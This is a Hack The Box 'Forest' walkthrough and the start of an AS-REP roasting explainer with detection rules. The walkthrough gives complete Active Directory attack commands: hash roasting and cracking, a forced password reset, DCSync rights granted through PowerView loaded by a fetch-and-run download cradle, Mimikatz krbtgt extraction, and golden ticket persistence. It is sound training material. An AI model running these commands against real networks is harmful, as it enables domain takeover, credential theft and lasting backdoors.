        "tags": ["Box","HTB","Easy","Windows","LDAP","Active Directory","DACL","GenericWrite","GenericAll","Kerberos","ASREPRoasting","mimikatz","Download Cradle",],
        "content": "Forest Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Forest How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Forest/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 12:54:10 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 12:54 GMT Nmap scan report for 10.129.95.210 Host is up (0.039s latency). Not shown: 989 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds Initial thoughts: DNS Kerberos SMB RPC LDAP Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Forrest/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 14:04:14 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 14:04 GMT Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 92.80% done; ETC: 14:05 (0:00:04 remaining) Nmap scan report for htb.local (10.129.107.25) Host is up (0.042s latency). Not shown: 65512 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-13 14:05:31Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49681/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=11/13%OT=53%CT=1%CU=40018%PV=Y%DS=2%DC=I%G=Y%TM=673 OS:4B276%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%TS=C)SEQ( OS:SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=106%GCD=1%ISR=10B%T OS:I=RD%CI=I%TS=3)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53C OS:NW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W OS:5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y OS:%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y% OS:T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIP OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2024-11-13T06:06:36-08:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-time: | date: 2024-11-13T14:06:40 |_ start_date: 2024-11-13T14:01:08 |_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 132.69 seconds +Note+: I had to do a reset of the box as this scan was hanging. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Neither work we can see that Guest is disabled and NULL sessions are disabled. +Note+: We can see the build number is 14393 so we can search for known exploits. I check \u0026amp; it says M17-07 but this is not valid on this box. Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] No dice, no users have used their username as passwords. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Standard entries for a DC. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Computers Users All domain objects A file containing all description fields It will also search the domain for any service/svc accounts and place them in a folder too. We have the naming context of the domain: kali in HTB/BlogEntriesMade/Forest/scans/ldap 🍣 main 📝 ×143🗃️ ×3🛤️ ×113 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:32:01 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box ------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.95.210 • Domain Name : htb.local • Server Name : FOREST • Forest Level: 7 • Domain Level: 7 It turns out the anonymous bind is enabled and we get the below information.\n------------------------------------------------------------ Connection Attempts ------------------------------------------------------------ • Attempting SSL connection... ✗ Failed to connect with SSL • Attempting non-SSL connection... ✓ Connected successfully using anonymous bind ------------------------------------------------------------ Security Warning ------------------------------------------------------------ ⚠️ WARNING: Connected using Anonymous Bind ⚠️ This is a security risk and should be disabled We have the domain functionality level:\n• Forest Level: 7 • Domain Level: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name \u0026amp; domain name:\n------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.95.210 • Domain Name : htb.local • Server Name : FOREST It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. The script also has created several files with various amounts on information lets examine those.\n------------------------------------------------------------ Processing Users ------------------------------------------------------------ [+] Detailed results written to UsersDetailed.txt [+] Basic names written to Users.txt ✓ Basic user names → Users.txt ✓ Detailed user info → UsersDetailed.txt ------------------------------------------------------------ Processing Groups ------------------------------------------------------------ [+] Groups written to GroupsDetailed.txt [+] Basic names written to Groups.txt ✓ Basic group names → Groups.txt ✓ Detailed group info → GroupsDetailed.txt ------------------------------------------------------------ Processing Computers ------------------------------------------------------------ [+] Computers written to ComputersDetailed.txt [+] Basic names written to Computers.txt ✓ Basic computer names → Computers.txt ✓ Detailed computer info → ComputersDetailed.txt ------------------------------------------------------------ Processing All Objects ------------------------------------------------------------ [+] Detailed results written to ObjectsDetailedLdap.txt [+] Basic names written to Objects.txt ✓ Basic object names → Objects.txt ✓ Detailed object info → ObjectsDetailedLdap.txt ------------------------------------------------------------ Processing Descriptions ------------------------------------------------------------ [+] All descriptions written to AllObjectDescriptions.txt ✓ All object descriptions → AllObjectDescriptions.txt It will also check for any service accounts and write them to a file:\n----------------------------------------------------------- Searching for Service Accounts ------------------------------------------------------------ 🔍 Searching Users.txt - No matches in Users.txt 🔍 Searching UsersDetailed.txt ✓ Found matches in UsersDetailed.txt 🔍 Searching Groups.txt ✓ Found matches in Groups.txt 🔍 Searching GroupsDetailed.txt ✓ Found matches in GroupsDetailed.txt 🔍 Searching Objects.txt ✓ Found matches in Objects.txt 🔍 Searching ObjectsDetailedLdap.txt ✓ Found matches in ObjectsDetailedLdap.txt 🔍 Searching AllObjectDescriptions.txt ✓ Found matches in AllObjectDescriptions.txt ✓ Service account findings written to ServiceAccounts.txt ✓ Found 646 potential matches Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;htb.local\u0026quot; update_var machine \u0026quot;forest\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host\u0026rsquo;s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. Searching the descriptions file for any passwords: I search for the string pass in the description field file but only pull up standard RODC group entries: Checking the users file: As the tool extracts valid usernames I now have a good usernames list I can use for password spraying etc: Finding a service account svc-alfresco in our LDAP Results: As my tool extracts service accounts from all the files, it finds a service account called* svc-alfresco in the Objects file: By running a simple search for svc I find the account. This is interesting as it also shows that the account is in a dedicated OU called \u0026ldquo;Service Accounts.\u0026rdquo; Manually Finding the svc-alfresco service account: First we would need to extract all OU\u0026rsquo;s to get the name of the OU to query manually:\nldapsearch -x -H ldap://$domain -b \u0026quot;dc=htb,dc=local\u0026quot; \u0026quot;(objectClass=organizationalUnit)\u0026quot; sAMAccountName As we can see it find the OU. Then we need to query for all objects within the OU \u0026quot;Service Accounts\u0026quot;:\nldapsearch -x -H ldap://$domain -b \u0026quot;ou=Service Accounts,dc=htb,dc=local\u0026quot; \u0026quot;(objectClass=*)\u0026quot; sAMAccountName We can then eventually see the service account listed. Service Accounts in AD: In many Active Directory (AD) environments, service accounts are often placed in a dedicated Organizational Unit (OU) to simplify management and apply specific policies or permissions. However, this varies widely based on organizational practices and security policies. Common Practices for Service Account OUs: Dedicated \u0026ldquo;Service Accounts\u0026rdquo; OU: Many organizations create a specific OU for service accounts (e.g., OU=Service Accounts,DC=domain,DC=com) to make it easier to manage these accounts and apply Group Policies (GPOs). Separation by Department or Function: Some environments organize service accounts by department (e.g., OU=IT Service Accounts) or function. Default Users OU: In less mature AD setups, service accounts may reside in the default Users container or other existing OUs without specific segregation. Benefits of Using a Dedicated Service Account OU: Centralized Management: Easier to apply specific permissions, delegate access control, or manage policies for service accounts collectively. Enhanced Security: Ensures that Group Policies can restrict privileges or enforce stricter password and lockout policies on service accounts, reducing attack surfaces. Kerberos 88: AS-REP Roasting svc-alfresco to retrieve their hash with impacket-GetNPUsers: As we have a users file we can attempt to asreproast the users: impacket-GetNPUsers $domain/ -dc-ip $box -usersfile Users.txt -format hashcat -outputfile asRepHashes.txt -no-pass We get a hit for \u0026ldquo;svc-alfresco\u0026rdquo;! +Note+: we could have also done impacket-GetNPUsers $domain/ -request and it will also find the account, however as I had the name of the account I was able to add it to my list of usernames and target them. What is svc-alfresco account for: A quick search leads me to this page: https://docs.alfresco.com/identity-service/latest/tutorial/sso/kerberos/ We can see that they recommend that when setting up the service account that the \u0026ldquo;Do not require Kerberos pre-authentication.\u0026rdquo; is enabled. So this is for this service to be able to authenticate back with the Domain Controller for authentication. But bloodstiller what does \u0026ldquo;Do not require Kerberos pre-authentication.\u0026rdquo; mean…glad you asked. AS-REP Roasting Primer: ASREPRoasting is an attack against Kerberos authentication where an attacker requests an AS-REP (Authentication Service Response) for user accounts that have the \u0026quot;Do not require Kerberos preauthentication\u0026quot; setting enabled (like the svc-alfresco account). We can then attempt to crack the encrypted TGT (Ticket-Granting Ticket) offline to obtain plaintext credentials for the account. The DONT_REQ_PREAUTH flag can sometimes be required for service accounts for compatibility (as we can see above.) ASREPRoasting is similar to Kerberoasting but targets AS-REP instead of TGS-REP (Ticket-Granting Service Response) +Detailed Deep Dive+: I have a deep dive on AS-REP Roasting. https://bloodstiller.com/articles/understandingasreproasting/ 2. Foothold: Cracking svc-alfresco\u0026rsquo;s hash with hashcat: I run hashcat to crack the hash:\nhashcat -m 18200 asRepHashes.txt ~/Wordlists/rockyou.txt It cracks I verify the creds are valid:\nnetexec smb $box -u $user -p $pass --shares They are Grabbing our user flag:\nI login with evil-winrm and grab the user flag: Performing a bloodhound collection as svc-alfresco: As we have creds the best thing to do is perform a bloodhound collection to look at valid attack paths:\nbloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box After I import the data I check for any direct paths to the domain controller object and there is a clear attack path (or so it seems):\nWe have nested group membership of Account Operators which has GenericAll over the Enterprise Key Admins \u0026amp; Key Admins which both have the AddKeyCredentialLink privilege over the root domain object. This means we can make ourselves the group owner, give ourselves the privilege to add users, add ourselves to the group \u0026amp; then we inherit the AddKeyCredentialLink privilege. The AddKeyCredentialLink allows us to perform a shadow credentials attack on the host so this looks like a good attack path and it would be in the right environment. The reason this attack chain will not work is that the Domain Controller does not have Active Directory Certificate Services (AD-CS) running which means if we retrieved a certificate via a shadow credentials attack we could not authenticate against with it. Discovering we are part of the Privileged IT Accounts Group : My next attack path, appears to be a lateral to the user \u0026ldquo;Sebastien\u0026rdquo;.\nIf we access the host using evil-winrm we can see that \u0026ldquo;Sebastien\u0026rdquo; also has an account on the host. As we are Part of the \u0026ldquo;Privileged IT Accounts\u0026rdquo; group which has nested group membership of the \u0026ldquo;Account Operators\u0026rdquo; group we inherit the \u0026quot;GenericAll\u0026quot; permission over \u0026ldquo;Sebastien\u0026rdquo; \u0026amp; therefore can perform various attacks over him.\nPerforming A Targeted Kerberoasting Attack On Sebastien: The first attack I will try is a Targeted Kerberoasting attack. \u0026ldquo;How does this attack work?\u0026rdquo; I hear you ask, good thing I am here:\n+Requirements+: For us to be able to perform this attack we need one of the following privileges over the user:\nGenericAll GenericWrite WriteProperty Validated-SPN WriteProperties If we have one of the above privileges we can then do the following:\nAttach/generate an SPN for the user account. Request TGS for the user account (and save it.) As TGS is encrypted with NTLM password hash we can then crack and overtake user account. I download targetedkerberoast.py \u0026amp; perform the attack:\ngit clone https://github.com/ShutdownRepo/targetedKerberoast I add the SPN to \u0026ldquo;sebastien\u0026rdquo; and this is saved to the file sebastien.kerb\npython3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user sebastien -o sebastien.kerb I then attempt to crack the hash, however I cannot crack it :(\nhashcat -m 13100 sebastien.kerb /home/kali/Wordlists/rockyou.txt -O I could try other rules but this box is rated as easy so if it\u0026rsquo;s not in rockyou.txt I doubt it will be intended to be cracked. Modifying \u0026ldquo;Sebastien\u0026rsquo;s\u0026rdquo; Password To Login As Him: As we cannot crack the hash so we will move onto changing passwords. As we have \u0026quot;GenericAll\u0026quot; privileges we can do what we want to his account.\nnewPass=bl00dst1ll3r! net rpc password \u0026quot;SEBASTIEN\u0026quot; $newPass -U $domain/$user%$pass -S $box +Note+: I do not like changing users passwords and see it as a last resort. There is no output from this so we need to verify it worked Verify it works \u0026ldquo;Sebastien\u0026rsquo;s\u0026rdquo; new creds work\nnetexec smb $box -u $user -p $newPass --shares Modifying \u0026ldquo;Sebastien\u0026rsquo;s\u0026rdquo; Group Memberships To Enable Us To Login: So we can login as \u0026ldquo;Sebastien\u0026rdquo; we will need to add him to the local group \u0026ldquo;Remote Management Users\u0026rdquo;\nBack in my \u0026ldquo;svc-alfresco\u0026rdquo; shell I add \u0026ldquo;Sebastien\u0026rdquo; to the \u0026ldquo;Remote Management Users\u0026rdquo; local group so he can login:\nnet localgroup \u0026quot;Remote Management Users\u0026quot; sebastien /add After some enumerating there appears to be nothing interesting \u0026ldquo;Sebastien\u0026rdquo; has access to on the host:\n3. Privilege Escalation: Finding Another Privilege Escalation Path In Bloodhound: Re-examining my bloodhound results the attack path seems very clear now. (woops) We have a straight shot to the root domain object from \u0026ldquo;svc-alfresco\u0026rdquo;\n\u0026ldquo;svc-alfresco\u0026rdquo; has inherited/nested membership to the Account Operators group \u0026amp; as the Account Operators group has GenericAll over EXCHANGE WINDOWS PERMISSIONS group, we in turn have GenericAll privileges over this group, much like we did with \u0026ldquo;sebastien\u0026rdquo;\nThis gives us a few different attack paths:\nThe first and easiest is adding a new user to the \u0026ldquo;Exchange Windows Permission\u0026rdquo; group and then granting them DCSync privileges over the root domain object to dump NTDS.dit. The second is in beyond root where we can dump it with svc-alfresco, however I was only able to perform this once. Intended Path To Root Adding A User \u0026amp; Granting Them DCSync Privileges: As we have GenericWrite over the group \u0026ldquo;EXCHANGE WINDOWS PERMISSIONS\u0026rdquo; we can add any users to the group \u0026amp; then in turn grant them DCSync privileges:\nAdd a user to the groups from svc-alfresco shell via evil-winrm:\nnet user bloodstiller bl00dst1ll3r! /add /domain Add to the user to the group \u0026ldquo;Exchane Windows Permissions\u0026rdquo;:\nnet group \u0026quot;Exchange Windows Permissions\u0026quot; bloodstiller /add Give the user remote management access by adding them to the group \u0026ldquo;Remote Management Users\u0026rdquo;:\nnet localgroup \u0026quot;Remote Management Users\u0026quot; bloodstiller /add This part is not necessary, however I want to use mimikatz so want remove access. To modify the ACL of the user we have created, we need to use PowerView:\nTo do this I will use a download cradle to load directly into memory for more information on download cradles see my +deep-dive+: https://bloodstiller.com/articles/understandingdownloadcradles/ Stand up python server: python -m http.server 9000 Load into memory: iex(new-object net.webclient).downloadstring('http://10.10.14.99:9000/PowerView.ps1') As we are still logged in as svc-alfresco, we need to use a Credentialed Object to grant our user DCSync Privileges:\n$SecPassword = ConvertTo-SecureString \u0026#39;bl00dst1ll3r!\u0026#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;htb\\bloodstiller\u0026#39;, $SecPassword) Grant ours user DCSync privileges with PowerView:\nAdd-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026quot;DC=htb,DC=local\u0026quot; -PrincipalIdentity bloodstiller -Rights DCSync We can now use secrets-dump to dump the NTDS.dit.\nimpacket-secretsdump $domain/$user:$pass@$box We can now login as the administrator using their hash and get the flag:\nevil-winrm -i $box -u $user -H $hash Granting svc-alfresco DCSync Rights (unintended path to root): +Note+: I have since tried to recreate this attack path with chaining the commands quickly and it will not work for me, maybe I got lucky on first try.\nAttack Path: Make \u0026ldquo;svc-alfresco\u0026rdquo; owner of the group \u0026ldquo;Exchange Windows Permissions\u0026rdquo; Grant \u0026ldquo;svc-alfresco\u0026rdquo; the ability to add users to the group \u0026ldquo;Exchange Windows Permissions\u0026rdquo; by modifying the DACL. Add \u0026ldquo;svc-alfresco\u0026rdquo; to the group to group \u0026ldquo;Exchange Windows Permissions\u0026rdquo;. Grant \u0026ldquo;svc-alfresco\u0026rdquo; DCSync privileges over the root domain object by modifying the DACL using our new inherited WriteDacl permission we now have by being part of the \u0026ldquo;Exhange Windows Permissions\u0026rdquo; group. Make \u0026ldquo;svc-alfresco\u0026rdquo; the new owner of Exchange Windows Permissions group:\nimpacket-owneredit -action write -new-owner $user -target-sid 'S-1-5-21-3072663084-364016917-1341370565-1121' $domain/$user:$pass +Note+: I extract the SID for this group from bloodhound, or we can use impacket-lookupsid Grant \u0026ldquo;svc-alfresco\u0026rdquo; the ability to add users to the group by modifying the DACL\u0026rsquo;s:\nimpacket-dacledit -action 'write' -rights 'WriteMembers' -principal $user -target-sid 'S-1-5-21-3072663084-364016917-1341370565-1121' $domain/$user:$pass Add \u0026ldquo;svc-alfresco\u0026rdquo; to the group:\nnet rpc group addmem \u0026quot;EXCHANGE WINDOWS PERMISSIONS\u0026quot; $user -U $domain/$user%$pass -S $box +Note+: There will be no output from this command, we need to instead verify it worked in the next command. Verify \u0026ldquo;svc-alfresco\u0026rdquo; is now part of the group*:\nnet rpc group members \u0026quot;EXCHANGE WINDOWS PERMISSIONS\u0026quot; -U $domain/$user%$pass -S $box Grant \u0026ldquo;svc-alfresco\u0026rdquo; DCSync privileges:\nimpacket-dacledit -action 'write' -rights 'DCSync' -principal $user -target-dn 'DC=HTB,DC=LOCAL' $domain/$user:$pass It does not work due to insufficient rights, which I know to be incorrect as we have granted them. I check our group membership \u0026amp; can see we have been removed from the group \u0026ldquo;Exchange Windows Permissions\u0026rdquo;:\nnet rpc group members \u0026quot;EXCHANGE WINDOWS PERMISSIONS\u0026quot; -U $domain/$user%$pass -S $box I suspect this will be due to a scheduled task that will run and ensure that the only user in the group is \u0026ldquo;Exchange Trusted Subsystem\u0026rdquo;. Luckily we have seen ourselves in the group so in theory all we have to do is re-add ourselves, grant ourselves DCSync privileges and then perform a DCSync attack in quick succession. We will run the below 2 commands, in quick succession to perform the final part of the attack:\nnet rpc group addmem \u0026quot;EXCHANGE WINDOWS PERMISSIONS\u0026quot; $user -U $domain/$user%$pass -S $box impacket-dacledit -action 'write' -rights 'DCSync' -principal $user -target-dn 'DC=HTB,DC=LOCAL' $domain/$user:$pass We can then quickly dump the NDST.dit database by using impacket-secrets dump:\nimpacket-secretsdump $domain/$user:$pass@$machine.$domain 4. Persistence: Creating a Kerberos Golden Ticket: We already have the KRBTGT hash via secretsdump however I wanted to show an alternate option with using invoke-mimikatz in a download cradle for a targeted extraction of just the KRBTGT aes hash.\nLogin as the user we have added:\nevil-winrm -i $box -u $user -p $newPass We can login as our new user or with admin, as long as we have administrator rights. Load mimikatz into memory via download cradle:\niex(new-object net.webclient).downloadstring('http://10.10.14.99:9000/Invoke-Mimikatz.ps1') Perform a targeted DCSync attack to extract the KRBTGT hash.\nInvoke-Mimikatz -Command '\u0026quot;privilege::debug\u0026quot; \u0026quot;lsadump::dcsync /user:krbtgt /domain:htb.local\u0026quot;' It spits out errors but we still manage to get the hashes. Sync our host clock to the host using ntpdate:\nsudo ntpdate -s $domain Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked: Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here\u0026rsquo;s why: KRBTGT Hash Dependence: Golden Tickets are generated using the KRBTGT account hash from the target\u0026rsquo;s domain controller. Unlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely. KRBTGT Hash—The Key to It All (for upto 10 years): A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials. This makes it a reliable backdoor, especially if re-access is needed long after initial entry. Think about it: even if they reset every user\u0026rsquo;s password (including the administrator etc) your Golden Ticket is still valid because it\u0026rsquo;s tied to the KRBTGT account, not individual users. Lessons Learned: What did I learn? I learned that even though I got a random bypass for a secondary route to root that I cannot recreate it no matter how hard I try (1 full day) I decided to actually put all of my ASREP-Roasting knowledge in an article so that hopefully cemeneted that further: https://bloodstiller.com/articles/understandingasreproasting/ What silly mistakes did I make? Had some real slow moments when I had multiple evil-winrm sessions open and was wondering why mimikatz would not work, because I was running it from a user without DCSync privs….. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "content": "Understanding AS-REP Roasting: General Overview and Attack Flow: ASREPRoasting is an attack against Kerberos authentication where an attacker requests an AS-REP (Authentication Service Response) for user accounts that have the \u0026quot;Do not require Kerberos preauthentication\u0026quot; setting enabled The attacker can then attempt to crack the encrypted TGT (Ticket-Granting Ticket) offline to obtain plaintext credentials ASREPRoasting is similar to Kerberoasting but targets AS-REP instead of TGS-REP (Ticket-Granting Service Response) Attack Process Attacker enumerates users with the \u0026ldquo;Do not require Kerberos preauthentication\u0026rdquo; setting Some vendor installation guides require service accounts with DONT_REQ_PREAUTH disabled, making these accounts vulnerable These accounts are less frequently used than Service Principal Names (SPNs), which are more commonly targeted in Kerberoasting attacks Requests an AS-REP from the Key Distribution Center (KDC) Cracks the encrypted TGT offline to retrieve plaintext credentials Attack Flow Diagram [Attacker] [Domain Controller/KDC] [Target User] | | | | 1. AS-REQ | | | (without Pre-Authentication) | | |-------------------------------------→ | | | | | | | 2. Checks if DONT_REQ_PREAUTH | | | is set for requested user | | | | | 3. AS-REP | | | (contains encrypted TGT) | | | ←-------------------------------------| | | | | | 4. Offline Password | | | Cracking Attempt | | | | | | | | [Success = Compromised Credentials] | | +Key Points+:\nNo interaction with target user required No failed login attempts generated Encryption uses user\u0026rsquo;s password hash Can be performed without domain credentials +For example+: we can run impacket-GetNPUsers without any authentication and retrieve the TGT. impacket-GetNPUsers $domain/ -request (more on tools later) Pre-Authentication Process: Normal Pre-Authentication:\nEncryption key for AS-REQ (Authentication Server Request) is a timestamp encrypted with the user\u0026rsquo;s password hash If the AS-REP timestamp is within a few minutes of the KDC\u0026rsquo;s time, the KDC will issue the TGT via AS-REP [Client] [KDC] | | | 1. AS-REQ | | (Encrypted Timestamp) | |--------------------------------\u0026gt;| | | | 2. Decrypt \u0026amp; Verify | | Timestamp | | | | 3. AS-REP | | (TGT if timestamp valid) | |\u0026lt;--------------------------------| | | Without Pre-Authentication (how ASREPRoasting works): Attacker sends a fake AS-REQ The KDC sends a TGT immediately, no password needed The AS-REP includes the TGT and additional encrypted data This data can be cracked offline to obtain the user\u0026rsquo;s key (password hash) [Attacker] [KDC] | | | 1. AS-REQ | | (No Pre-Auth Required) | |--------------------------------\u0026gt;| | | | 2. No Verification | | Needed | | | | 3. AS-REP | | (Encrypted TGT + Data) | |\u0026lt;--------------------------------| | | | 4. Offline Cracking | | Begins | | | Detection and Defense: Detection Methods Monitor Active Directory logs for unusual AS-REP requests, particularly those without preauthentication: Event ID = 4768 and 4625 Ticket Encryption Type = 0x17. Ticket Options = 0x5080000. Service Name = krbtgt Regularly scan user accounts for the DONT_REQ_PREAUTH attribute SIEM Detection Rules: Splunk: index=windows EventCode=4768 AND Preauthentication_Type=\u0026quot;0x0\u0026quot; Microsoft Sentinel: 